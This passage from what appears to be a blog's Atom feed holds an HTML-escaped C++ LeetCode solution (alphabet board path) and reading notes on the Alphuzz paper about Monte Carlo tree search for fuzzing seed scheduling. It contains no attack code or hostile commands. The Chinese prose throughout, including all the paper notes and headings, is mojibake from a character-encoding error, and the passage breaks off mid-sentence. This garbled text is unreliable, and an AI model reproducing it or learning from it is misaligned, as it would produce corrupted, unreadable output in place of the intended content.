class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;string &lt;span class=&quot;title&quot;&gt;alphabetBoardPath&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(string target)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; x = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, y = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        string res = &lt;span class=&quot;string&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;char&lt;/span&gt; c : target) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; next_x = &lt;span class=&quot;built_in&quot;&gt;getX&lt;/span&gt;(c), next_y = &lt;span class=&quot;built_in&quot;&gt;getY&lt;/span&gt;(c);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;char&lt;/span&gt; step_x = &lt;span class=&quot;string&quot;&gt;&amp;#x27;L&amp;#x27;&lt;/span&gt;, step_y = &lt;span class=&quot;string&quot;&gt;&amp;#x27;U&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; diff_x = x - next_x, diff_y = y - next_y;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(next_x &amp;gt; x) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                step_x = &lt;span class=&quot;string&quot;&gt;&amp;#x27;R&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                diff_x = -diff_x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(next_y &amp;gt; y) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                step_y = &lt;span class=&quot;string&quot;&gt;&amp;#x27;D&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                diff_y = - diff_y;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(next_y == &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; diff_x; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    res += step_x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; diff_y; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    res += step_y;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; diff_y; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    res += step_y;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; diff_x; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    res += step_x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            res += &lt;span class=&quot;string&quot;&gt;&amp;quot;!&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            x = next_x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            y = next_y;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; res;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;getX&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;char&lt;/span&gt; c)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (c - &lt;span class=&quot;string&quot;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;) % &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;getY&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;char&lt;/span&gt; c)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (c - &lt;span class=&quot;string&quot;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;) / &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;å¦‚æœé»˜è®¤å…ˆçºµå‘èµ°ï¼Œå†æ¨ªå‘èµ°ï¼Œé‚£ä¹ˆå½“ä»å¤–éƒ¨åˆ°zæ—¶ï¼Œéœ€è¦å…ˆæ¨ªå‘èµ°å†çºµå‘èµ°&lt;br&gt;å¦‚æœé»˜è®¤å…ˆæ¨ªå‘èµ°ï¼Œå†çºµå‘èµ°ï¼Œé‚£ä¹ˆå½“ä»zåˆ°å¤–éƒ¨æ—¶ï¼Œéœ€è¦å…ˆçºµå‘èµ°å†æ¨ªå‘èµ°&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;2335-è£…æ»¡æ¯å­éœ€è¦çš„æœ€çŸ­æ€»æ—¶é•¿&quot;&gt;&lt;a href=&quot;#2335-è£…æ»¡æ¯å­éœ€è¦çš„æœ€çŸ­æ€»æ—¶é•¿&quot; class=&quot;headerlink&quot; title=&quot;2335. è£…æ»¡æ¯å­éœ€è¦çš„æœ€çŸ­æ€»æ—¶é•¿&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/minimum-amount-of-time-to-fill-cups/&quot;&gt;2335. è£…æ»¡æ¯å­éœ€è¦çš„æœ€çŸ­æ€»æ—¶é•¿&lt;/a&gt;&lt;/h2&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>DNSç¬¬äº”å‘¨æ–‡çŒ®é˜…è¯»</title>
    <link href="https://jingtianer.github.io/home/2023/02/12/%E7%BB%84%E4%BC%9A/DNS%E7%AC%AC%E4%BA%94%E5%91%A8%E6%96%87%E7%8C%AE%E9%98%85%E8%AF%BB/"/>
    <id>https://jingtianer.github.io/home/2023/02/12/%E7%BB%84%E4%BC%9A/DNS%E7%AC%AC%E4%BA%94%E5%91%A8%E6%96%87%E7%8C%AE%E9%98%85%E8%AF%BB/</id>
    <published>2023-02-12T04:15:37.000Z</published>
    <updated>2023-02-12T13:57:28.074Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Alphuzz-Monte-Carlo-Search-on-Seed-Mutation-Tree-for-Coverage-Guided"><a href="#Alphuzz-Monte-Carlo-Search-on-Seed-Mutation-Tree-for-Coverage-Guided" class="headerlink" title="Alphuzz: Monte Carlo Search on Seed-Mutation Tree for Coverage-Guided"></a>Alphuzz: Monte Carlo Search on Seed-Mutation Tree for Coverage-Guided</h2><h3 id="abstract"><a href="#abstract" class="headerlink" title="abstract"></a>abstract</h3><p>åœ¨æœ¬ç ”ç©¶ä¸­ï¼Œæˆ‘ä»¬å‘ç°ç§å­ä¹‹é—´çš„å…³ç³»å¯¹äºç§å­è°ƒåº¦æ˜¯æœ‰ä»·å€¼çš„ã€‚æˆ‘ä»¬é€šè¿‡ç ”ç©¶å’Œåˆ©ç”¨ç§å­ä¹‹é—´çš„å˜å¼‚å…³ç³»ï¼Œè®¾è®¡å¹¶æå‡ºäº†ä¸€ä¸ªâ€ç§å­å˜å¼‚æ ‘â€ã€‚åˆ©ç”¨â€ç§å­å˜å¼‚æ ‘â€ï¼Œæˆ‘ä»¬è¿›ä¸€æ­¥å°†ç§å­è°ƒåº¦é—®é¢˜å»ºæ¨¡ä¸ºè’™ç‰¹å¡æ´›æ ‘æœç´¢( MCTS )é—®é¢˜ã€‚å³åœ¨MCTSä¼°è®¡çš„åŸºç¡€ä¸Šï¼Œé€šè¿‡æœ€ä¼˜è·¯å¾„éå†â€ç§å­å˜å¼‚æ ‘â€ï¼Œé€‰æ‹©ä¸‹ä¸€ä¸ªç§å­è¿›è¡Œæ¨¡ç³Šå¤„ç†ã€‚</p><h3 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h3><p>å¤§é‡çš„ç§å­è°ƒåº¦ç­–ç•¥è¢«æå‡ºã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¿™äº›ç­–ç•¥çš„ç›®çš„æ˜¯æ ¹æ®ä¸€å®šçš„æ ‡å‡†ä¸ºæ¯ä¸ªç§å­åˆ†é…ä¸€ä¸ªåˆ†æ•°ï¼Œç„¶åé€‰æ‹©åˆ†æ•°æœ€é«˜çš„ç§å­è¿›è¡Œä¸‹ä¸€æ¬¡çš„æ¨¡ç³Šè¿­ä»£ã€‚ä¾‹å¦‚ï¼ŒAFLåå¥½äºå…·æœ‰æœ€å°å°ºå¯¸å’Œæœ€çŸ­æ‰§è¡Œæ—¶é—´çš„ç§å­ã€‚è¿™äº›ç­–ç•¥ç‹¬ç«‹åœ°å¯¹å¾…è¿™äº›ç§å­ï¼Œå¹¶æ²¡æœ‰æ˜ç¡®åœ°è€ƒè™‘ç§å­ä¹‹é—´çš„å…³ç³»ã€‚</p><p>â€œç§å­å˜å¼‚æ ‘â€çš„ä¸»è¦ä¼˜ç‚¹æ˜¯æœ‰åˆ©äºç§å­è°ƒåº¦åœ¨åˆ©ç”¨å¼(å³,åå¤é”»ç‚¼ä¸€ä¸ªé«˜ç”µä½çš„ç§å­å’Œå®ƒçš„é‚»å±…)å’Œæ¢ç´¢å¼(å³,å°è¯•ä¸€ä¸ªå¾ˆå°‘é”»ç‚¼çš„ç§å­)ä¹‹é—´è¿›è¡Œå¹³è¡¡ï¼Œä»¥è·å¾—æœ€ä½³æ€§èƒ½ã€‚å¦‚ä¸Šæ‰€è¿°ï¼Œç§å­è°ƒåº¦æ˜¯æŒ‡ä¸ºæ¢ç´¢å…¶é‚»å±…è·¯å¾„è€Œé€‰æ‹©ä¸€æ¡æ‰§è¡Œè·¯å¾„ã€‚åˆ©ç”¨ç§å­ä¹‹é—´çš„å…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥å°†æ¯ä¸ªç§å­å¯¹åº”çš„è·¯å¾„ç»„ç»‡ä¸ºä¸€ä¸ªæ ‘ç»“æ„ï¼Œè®°ä¸ºæ‰§è¡Œæ ‘ã€‚</p><h3 id="è®ºæ–‡è´¡çŒ®"><a href="#è®ºæ–‡è´¡çŒ®" class="headerlink" title="è®ºæ–‡è´¡çŒ®"></a>è®ºæ–‡è´¡çŒ®</h3><ul><li>æ–°è§è§£ã€‚æˆ‘ä»¬é‡ç‚¹è§‚å¯Ÿåˆ°ç§å­ä¹‹é—´çš„å…³ç³»å¯¹äºç§å­è°ƒåº¦æ˜¯æœ‰ä»·å€¼çš„ã€‚æˆ‘ä»¬ç ”ç©¶å¹¶åˆ©ç”¨ç§å­å˜å¼‚å…³ç³»æ¥æ„å»ºä¸€ä¸ªâ€ç§å­å˜å¼‚æ ‘â€ï¼Œå®ƒæ˜¯æ¨¡ç³Šæµ‹è¯•æ‰§è¡Œæ ‘çš„è¿‘ä¼¼ï¼Œå¯ä»¥è¿›ä¸€æ­¥å¸®åŠ©ç§å­è°ƒåº¦å¹³è¡¡åˆ©ç”¨å’Œæ¢ç´¢ã€‚</li><li>æ–°çš„fuzzingæŠ€æœ¯ã€‚åˆ©ç”¨â€ç§å­å˜å¼‚æ ‘â€ï¼Œæˆ‘ä»¬å°†ç§å­è°ƒåº¦é—®é¢˜å»ºæ¨¡ä¸ºè’™ç‰¹å¡æ´›æ ‘æœç´¢( MCTS )é—®é¢˜ï¼Œå¹¶æå‡ºäº†åŸºäºMCTSçš„ç§å­è°ƒåº¦ç­–ç•¥ã€‚ç”±äºMCTSç®—æ³•çš„æ€§è´¨ï¼Œè¯¥ç­–ç•¥åœ¨åˆ©ç”¨å’Œæ¢ç´¢ä¹‹é—´å–å¾—äº†å¹³è¡¡ã€‚</li></ul><h3 id="ç§å­å˜å¼‚æ ‘"><a href="#ç§å­å˜å¼‚æ ‘" class="headerlink" title="ç§å­å˜å¼‚æ ‘"></a>ç§å­å˜å¼‚æ ‘</h3><p>ç§å­å˜å¼‚æ ‘è¢«å®šä¹‰æˆä¸€ä¸ªä¸‰å…ƒç»„ï¼ŒT &#x3D; (V, E, ğ›¼),Væ˜¯ç§å­ï¼ŒEæ˜¯è¾¹ï¼Œğ›¼æ˜¯çªå˜å…³ç³»</p><ul><li>æœ€åˆï¼Œæ ‘ç”±æ ¹èŠ‚ç‚¹å’Œå‡ ä¸ªåˆå§‹ç§å­çš„èŠ‚ç‚¹æ„æˆ</li><li>é€‰æ‹©ä¸€ä¸ªç§å­å˜å¼‚ï¼Œç”Ÿæˆæ–°çš„æµ‹è¯•ç”¨ä¾‹ã€‚ç„¶åï¼Œå°†æ–°ç”Ÿæˆçš„è¦†ç›–æ–°è·¯å¾„çš„æµ‹è¯•ç”¨ä¾‹ä½œä¸ºåŸå§‹ç§å­çš„å­ä»£åŠ å…¥åˆ°â€ç§å­å˜å¼‚æ ‘â€ä¸­ã€‚</li><li>ä¸€äº›ç‰¹æ®Šçš„çªå˜å¯èƒ½ä½œç”¨äºä¸¤ä¸ªç§å­ã€‚ä¾‹å¦‚ï¼ŒAFLä¸­å‰ªæ¥ä½“çš„çªå˜ä¼šå°†ä¸€ä¸ªç§å­ä¸ç¬¬äºŒä¸ªç§å­è¿›è¡Œå‰ªæ¥ï¼Œäº§ç”Ÿæ–°çš„è¾“å…¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åªåœ¨æ–°èŠ‚ç‚¹å’Œç¬¬ä¸€ä¸ªç§å­å¯¹åº”çš„èŠ‚ç‚¹ä¹‹é—´æ„é€ ä¸€æ¡è¾¹ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªç§å­æ˜¯é€šè¿‡ç§å­è°ƒåº¦ç­–ç•¥é€‰æ‹©çš„ï¼Œè€Œç¬¬äºŒä¸ªç§å­æ˜¯éšæœºé€‰æ‹©çš„ã€‚</li></ul><h4 id="ä¸‰ä¸ªæŒ‘æˆ˜"><a href="#ä¸‰ä¸ªæŒ‘æˆ˜" class="headerlink" title="ä¸‰ä¸ªæŒ‘æˆ˜"></a>ä¸‰ä¸ªæŒ‘æˆ˜</h4><ul><li>æœç´¢ç©ºé—´å¤§ä¸”ä¸æ–­å¢å¤§ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¯å‘å¼ç®—æ³•æ¥æä¾›å½“å‰çš„æœ€ä½³å†³ç­–ã€‚</li><li>å¯å‘å¼ç®—æ³•çš„æ ¸å¿ƒæ˜¯ç»™ç§å­åˆ†é…åˆ†æ•°ã€‚ç„¶è€Œï¼Œéšç€æ¨¡ç³Šæµ‹è¯•å¯¹å…¶ç›¸é‚»è·¯å¾„çš„æ¢ç´¢è¶Šæ¥è¶Šæ·±å…¥ï¼Œç§å­è¦†ç›–è·¯å¾„çš„å¾—åˆ†å¯èƒ½ä¼šä¸‹é™ã€‚å› æ­¤ï¼Œåœ¨æ¯æ¬¡æ¨¡ç³Šè¿­ä»£åæ›´æ–°æ ‘ä¸Šæ‰€æœ‰ç§å­çš„å¾—åˆ†æ˜¯å¿…è¦çš„ï¼Œä½†ä¹Ÿæ˜¯å…·æœ‰æŒ‘æˆ˜æ€§çš„ã€‚</li><li>å¾ˆéš¾å¹³è¡¡å¼€å‘å’Œåˆ©ç”¨ã€‚ç”±äºæ¨¡ç³Šæµ‹è¯•æœ¬è´¨ä¸Šçš„éšæœºåŒ–ç‰¹æ€§çš„å½±å“ï¼Œç»è¿‡ä¸€æ¬¡æ¨¡ç³Šæµ‹è¯•è¿­ä»£åè®¡ç®—å‡ºçš„ç§å­è¯„åˆ†ä¼šå—åˆ°è¿™ç§ä¸ç¡®å®šæ€§çš„å½±å“ã€‚å› æ­¤ï¼Œå¦‚ä½•åœ¨è¿™äº›ä¸ç¡®å®šå› ç´ ä¸‹å¹³è¡¡å¼€å‘å’Œåˆ©ç”¨æ˜¯ä¸€ä¸ªæŒ‘æˆ˜ã€‚</li></ul><h3 id="è’™ç‰¹å¡æ´›æœç´¢"><a href="#è’™ç‰¹å¡æ´›æœç´¢" class="headerlink" title="è’™ç‰¹å¡æ´›æœç´¢"></a>è’™ç‰¹å¡æ´›æœç´¢</h3><p>MCTSæ˜¯ä¸€ç§é€šè¿‡åŸºäºéšæœºæŠ½æ ·çš„é¡ºåºæ„å»ºæ ‘è¿›è¡Œæœ€ä¼˜å†³ç­–çš„ç®—æ³•ã€‚è¯¥è¿‡ç¨‹åŒ…æ‹¬å››ä¸ªæ­¥éª¤ï¼š</p><ul><li>é€‰æ‹©ã€‚MCTSé‡‡ç”¨ç‰¹å®šçš„æ ‘ç­–ç•¥ï¼Œä»æ ¹èŠ‚ç‚¹Rå¼€å§‹ï¼Œé€’å½’åœ°é€‰æ‹©æœ€ä¼˜çš„å­èŠ‚ç‚¹ï¼Œç›´åˆ°è¾¾åˆ°ä¸€ä¸ªå¶èŠ‚ç‚¹Lã€‚</li><li>æ‰©å¼ ã€‚å¦‚æœLä¸æ˜¯ç»ˆç«¯èŠ‚ç‚¹ï¼Œåˆ™MCTSåˆ›å»ºä¸€ä¸ªæˆ–å¤šä¸ªå­èŠ‚ç‚¹ã€‚è¿›ä¸€æ­¥ï¼Œä»è¿™äº›å­èŠ‚ç‚¹ä¸­é€‰æ‹©ä¸€ä¸ªèŠ‚ç‚¹Cã€‚åœ¨è¿™ä¸€æ­¥ä¸­ï¼Œå­èŠ‚ç‚¹æŒ‡çš„æ˜¯æ¥è‡ªLå®šä¹‰çš„çŠ¶æ€çš„ä»»ä½•æœ‰æ•ˆç§»åŠ¨ã€‚</li><li>ä»¿çœŸã€‚é€šè¿‡éšæœºé€‰æ‹©åŠ¨ä½œæ¥æ‰§è¡Œï¼Œç›´åˆ°è¾¾åˆ°ä¸€ä¸ªç»“æœæˆ–é¢„å®šä¹‰çš„çŠ¶æ€ã€‚</li><li>åå‘ä¼ æ’­ã€‚è¿™ä¸€æ­¥å›ä¼ ä»æ–°èŠ‚ç‚¹Cä¼ æ’­åˆ°æ ¹èŠ‚ç‚¹Rï¼Œæ›´æ–°ä»¿çœŸç»“æœã€‚</li></ul><p>æ ‘çš„ç½®ä¿¡ä¸Šç•Œï¼ˆUCBï¼‰ï¼šUCBå…¬å¼å¹³è¡¡äº†å¯¹å·²çŸ¥å¥–åŠ±çš„åˆ©ç”¨å’Œå¯¹ç›¸å¯¹æœªè®¿é—®èŠ‚ç‚¹çš„æ¢ç´¢ï¼Œä»¥è·å¾—æœ€ä½³æ€§èƒ½ã€‚</p><h4 id="åŸºäºè’™ç‰¹å¡æ´›çš„ç§å­è°ƒåº¦ç®—æ³•"><a href="#åŸºäºè’™ç‰¹å¡æ´›çš„ç§å­è°ƒåº¦ç®—æ³•" class="headerlink" title="åŸºäºè’™ç‰¹å¡æ´›çš„ç§å­è°ƒåº¦ç®—æ³•"></a>åŸºäºè’™ç‰¹å¡æ´›çš„ç§å­è°ƒåº¦ç®—æ³•</h4><p>MCTSä»æ ¹èŠ‚ç‚¹å¼€å§‹ï¼Œåœ¨æ¯ä¸ªå±‚æ¬¡ä¸Šé€‰æ‹©å¾—åˆ†æœ€é«˜çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œç›´åˆ°è¾¾åˆ°ä¸€ä¸ªå¶èŠ‚ç‚¹ã€‚ç„¶åï¼Œæ¨¡ç³Šæµ‹è¯•åœ¨ç›‘è§†æ–°ç”Ÿæˆçš„è¾“å…¥çš„æ‰§è¡Œçš„åŒæ—¶éšæœºå˜å¼‚æ‰€é€‰çš„ç§å­ã€‚ç”±äºå¹¶ä¸æ˜¯æ‰€æœ‰æ–°ç”Ÿæˆçš„è¾“å…¥éƒ½æé«˜äº†ä»£ç è¦†ç›–ç‡ï¼Œå› æ­¤æˆ‘ä»¬å…ˆè¿›è¡Œä»¿çœŸï¼Œåªåœ¨æ ‘ä¸­æ·»åŠ æé«˜ä»£ç è¦†ç›–ç‡çš„è¾“å…¥ã€‚æœ€åï¼Œæˆ‘ä»¬åœ¨æ¯æ¬¡æ¨¡ç³Šè¿­ä»£åæ›´æ–°ç§å­çš„å¾—åˆ†</p><h4 id="æ ‘çš„æ„å»ºä¸æ‰©å±•"><a href="#æ ‘çš„æ„å»ºä¸æ‰©å±•" class="headerlink" title="æ ‘çš„æ„å»ºä¸æ‰©å±•"></a>æ ‘çš„æ„å»ºä¸æ‰©å±•</h4><p>â€œç§å­å˜å¼‚æ ‘â€ä¸­ï¼Œä¸€ä¸ªå†…éƒ¨èŠ‚ç‚¹æœ‰ä¸¤ç§ä¸åŒçš„è§’è‰²ã€‚é¦–å…ˆï¼Œå®ƒæŒ‡çš„æ˜¯ç§å­ã€‚å…¶æ¬¡ï¼Œä»æ ‘çš„ç»“æ„æ¥çœ‹ï¼Œå®ƒä¹Ÿæ˜¯å­æ ‘çš„æ ¹èŠ‚ç‚¹ã€‚å› æ­¤ï¼Œä¸€ä¸ªå†…éƒ¨èŠ‚ç‚¹å³ä½¿æœ‰å¤šä¸ªå­èŠ‚ç‚¹ä¹Ÿå¯ä»¥è¢«é€‰ä¸ºç§å­ã€‚<br>ä½œä¸ºç§å­ï¼Œåˆ†æ•°æ˜¯æŒ‡é€‰æ‹©è¯¥ç§å­çš„æ¨¡ç³Šåº¦å¾—åˆ†ã€‚ä½œä¸ºå­æ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œåˆ†æ•°æŒ‡çš„æ˜¯é€‰æ‹©å­æ ‘ä¸­æ¯ä¸ªç§å­çš„æ‘˜è¦æ¨¡ç³Šåº¦å¾—åˆ†ã€‚</p><p>ä¸ºäº†è§£å†³è¿™ç§ä¸ç›¸å®¹æ€§ï¼Œæˆ‘ä»¬é€šè¿‡ä¸ºæ¯ä¸ªå†…éƒ¨èŠ‚ç‚¹æ’å…¥ä¸€ä¸ªå˜å¼‚èŠ‚ç‚¹æ¥æ›´æ–°â€ç§å­å˜å¼‚æ ‘â€ã€‚å†…éƒ¨èŠ‚ç‚¹æŒ‡å…¶å­æ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œå˜ä½“æŒ‡å…¶å¯¹åº”çš„ç§å­ã€‚è¿™æ ·ï¼Œå˜ä½“å°†æ˜¯å†…éƒ¨èŠ‚ç‚¹çš„ä¸€ä¸ªå¶å­èŠ‚ç‚¹ã€‚å¯¹äºæ¨¡ç³Šå¾—åˆ†ï¼Œå†…éƒ¨èŠ‚ç‚¹æŒ‡å­æ 